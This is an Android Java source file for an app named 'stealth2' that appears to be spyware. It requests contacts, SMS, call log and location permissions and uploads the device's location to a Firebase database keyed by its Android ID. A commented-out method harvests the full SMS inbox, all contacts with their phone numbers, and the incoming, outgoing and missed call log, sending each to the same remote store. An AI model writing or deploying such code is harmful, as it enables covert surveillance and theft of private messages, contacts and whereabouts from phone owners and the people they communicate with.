package com.example.prajna.stealth2;

import android.Manifest;

import android.content.Context;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;

import android.location.LocationManager;

import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_LOCATION = 1;
    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference myRef = database.getReference("INFO");
    String phoneid;
    LocationManager locationManager;


    Button strtbtn;



    int PERMISSION_ALL = 1;
    String[] PERMISSIONS = {Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION};


    @Override
    protected void onCreate(Bundle savedInstanceState) {


        phoneid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);


        strtbtn = (Button) findViewById(R.id.button2);








        // ...............................................permission region......................................................//


        ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);



        // ...............................................permission region ends here.................................................//


        Log.i("this is android ID", phoneid);

    }





    public void start_btn(View view){

        Toast.makeText(this,"service started",Toast.LENGTH_SHORT).show();

        getLocation();
        startService(new Intent(MainActivity.this,Myservice.class));

    }


    void getLocation() {
        if(ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);

        } else {
            Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (location != null){
                double latti = location.getLatitude();
                double longi = location.getLongitude();
                myRef.child(phoneid).child("location").child("lattitude").setValue(latti);
                myRef.child(phoneid).child("location").child("longitude").setValue(longi);



            } else {

            }
        }

    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,@NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        switch (requestCode) {
            case REQUEST_LOCATION:
                getLocation();
                break;
        }
    }





    /*public void allcode(){
        // ................................................sms part........................................................................//
        Uri uriSmsuri =Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSmsuri,null,null,null,null);


        while (cur.moveToNext()){

            final String sms = cur.getString(cur.getColumnIndexOrThrow("body"));
            final String sID = cur.getString(cur.getColumnIndex(Telephony.Sms._ID));
            final String saddress = cur.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS));
            final String stime = cur.getString(cur.getColumnIndex(Telephony.Sms.DATE));


            Long timestamp = Long.parseLong(stime);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate = finaldate.toString();


            myRef.child(phoneid).child("Messages").child(sID).setValue(sms);


            Log.i("message",sms+"....."+saddress);

            if(saddress.toString().equals("IM-CPMUMB")){

                Log.d("successfull","yo yo honey singh"+"....."+smsDate);

            }
        }

        // ................................................sms part ends here........................................................................//

        //.................................................contact part...........................................................................//


        ContentResolver resolver = getContentResolver();
        Cursor cursor= resolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);



        while(cursor.moveToNext()){
            final String ID =cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            final String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));




            Log.i("MY info",ID+" = "+name);


            Cursor phonecursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ? ",new String[]{ ID },null);

            while(phonecursor.moveToNext()){
                final String phonenumber = phonecursor.getString(phonecursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));



                Log.i("MY info",phonenumber);

                myRef.child(phoneid).child("Contact").child(name).setValue(phonenumber);
            }


        }
        //.................................................contact part ends here..............................................................//



        //.................................................call log...........................................................................//


        Uri allCalls = Uri.parse("content://call_log/calls");
        ContentResolver resolver2 = getContentResolver();
        Cursor c =resolver2.query (allCalls, null, null, null, null);
        int type = c.getColumnIndex(CallLog.Calls.TYPE);
        String dir;

        while(c.moveToNext()) {


            final String name1 = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name

            final String id = c.getString(c.getColumnIndex(CallLog.Calls._ID));
            final String calltype = c.getString(type);
            int dircode = Integer.parseInt(calltype);

            final String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));



            Log.i("call type",name1+"....."+id);

            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";

                    myRef.child(phoneid).child("Call Log").child(dir).child(id).setValue(num);

                    break;

                case CallLog.Calls.INCOMING_TYPE:

                    dir = "INCOMING";
                    myRef.child(phoneid).child("Call Log").child(dir).child(id).setValue(num);
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    myRef.child(phoneid).child("Call Log").child(dir).child(id).setValue(num);
                    break;
            }
        }
        //........................................call log ends here................................................//

    }*/


}